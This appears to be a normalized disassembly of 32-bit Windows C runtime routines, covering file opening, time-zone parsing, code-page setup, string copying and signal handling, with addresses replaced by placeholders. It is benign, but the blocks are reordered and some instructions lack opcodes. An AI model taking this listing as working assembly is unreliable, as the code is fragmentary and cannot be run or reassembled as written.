and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + edx * 8 + 0x4 ] 0x1
je r-xdata
push eax
call sub_40b5ec
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
retn
mov [ rw-data ] eax
test eax eax
je r-xdata
sub_40b680
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
je r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ rw-data ] 0x16
mov [ rw-data ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
or eax 0xffffffff
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
jmp r-xdata
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_40b466
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x18
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_40b3ff
pop ecx
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov eax edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_40b4fb
pop ecx
mov al [ ebp - 0x1 ]
pop ecx
mov esi ebx
mov ecx ebx
or al 0x1
sar ecx 0x5
and esi 0x1f
mov [ ebp + 0xb ] al
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
and [ ebp + 0xb ] 0x48
mov [ ecx + esi + 0x4 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_40aba4
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_408308
add esp 0xc
test eax eax
jne r-xdata
cmp [ rw-data ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_40aba4
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
jmp r-xdata
push ebx
call sub_408044
pop ecx
push [ ebp - 0x10 ]
push ebx
call sub_40db46
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_40b939
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
mov [ rw-data ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_40b9b6
push ecx
push ebx
push ebp
push esi
push edi
xor ebp ebp
or ebx 0xffffffff
push r--data
xor edi edi
mov [ rw-data ] ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call sub_40dd17
mov esi eax
pop ecx
cmp esi ebp
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bp
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_405bdc
push esi
call sub_40ab20
inc eax
push eax
call sub_4044f2
add esp 0xc
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_409e20
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bp
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_40a890
push 0x3
push esi
push [ rw-data ]
call sub_40c4c0
mov eax [ rw-data ]
add esi 0x3
add esp 0x14
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push esi
call sub_40dc8c
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
push 0x1
inc esi
pop edi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ esp + 0x10 ] ebp
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ esp + 0x10 ] ebp
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ esp + 0x10 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebp
push 0x3f
mov edi 0x220
push [ rw-data ]
push ebx
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebp
push 0x3f
push [ rw-data ]
push ebx
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp edi ebp
je r-xdata
inc esi
push esi
call sub_40dc8c
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_40c4c0
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_40dc8c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_40bc14
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_40bdc0
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_40bdc0
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_40bdc0
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_40bdc0
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_40bdc0
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jg r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_40bf00
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
cmp esi 0xffffffe0
push edi
mov [ ebp + 0x8 ] esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_406c43
test eax eax
pop ecx
je r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
push eax
call sub_4071cc
mov edi eax
pop ecx
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
shr eax 0x4
push eax
call sub_407c6f
mov edi eax
pop ecx
test edi edi
jne r-xdata
push [ ebp + 0x8 ]
jmp r-xdata
push esi
jmp r-xdata
push 0x0
push edi
call sub_4043c0
add esp 0xc
sub_40bfb1
push esi
push edi
push 0x3
xor edi edi
pop esi
cmp [ rw-data ] esi
jle r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_4045af
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_405bdc
mov eax [ rw-data ]
pop ecx
and [ eax + esi * 4 ] 0x0
inc edi
sub_40c01a
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_40c04b
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_40c1e4
mov esi eax
pop ecx
cmp esi [ rw-data ]
mov [ ebp + 0x8 ] esi
je r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40c261
xor edx edx
mov eax rw-data
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
lea esi [ edx + edx * 2 ]
mov [ ebp - 0x4 ] ebx
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jb r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] esi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_40c22e
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x40
xor eax eax
pop ecx
mov edi rw-data
cmp [ ebp - 0x18 ] 0x1
mov [ rw-data ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_40c28a
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or eax 0xffffffff
mov [ rw-data ] ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push esi
call sub_40c22e
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] 0x1
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_40c1e4
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_40c22e
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40c261
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_40c28a
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_40c730
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_40c879
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_40c879
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_40c42b
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_40c4c0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_40c5be
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
dec eax
dec eax
je r-xdata
mov esi [ rw-data ]
mov eax rw-data
dec eax
dec eax
je r-xdata
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_40c6eb
mov esi [ eax + 0x8 ]
add eax 0x8
pop ecx
jmp r-xdata
sub eax 0x4
je r-xdata
push ebx
push 0x8
pop ecx
cmp edi ecx
je r-xdata
push 0x3
call sub_404bd3
pop edi
pop esi
pop ebp
retn
cmp esi 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov ebx [ rw-data ]
and [ rw-data ] 0x0
cmp edi ecx
jne r-xdata
cmp edi 0xb
je r-xdata
sub eax 0x4
je r-xdata
and [ eax ] 0x0
cmp edi ecx
jne r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x8c
mov [ ebp + 0x8 ] edx
jmp r-xdata
cmp edi 0x4
jne r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
push edi
call esi
cmp edi 0xb
pop ecx
je r-xdata
push [ rw-data ]
push 0x8
call esi
pop ecx
pop ecx
jmp r-xdata
cmp edi ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
dec eax
je r-xdata
cmp edi 0x8
mov [ rw-data ] ebx
jne r-xdata
cmp edi 0x4
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
cmp eax ecx
jge r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
pop ebx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
lea edx [ eax + eax * 2 ]
sub ecx eax
lea edx [ edx * 4 + rw-data ]
and [ edx ] 0x0
add edx 0xc
dec ecx
jne r-xdata
jmp r-xdata
sub_40c6eb
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40c730
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_40b3d0
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_4043c0
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_40c879
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
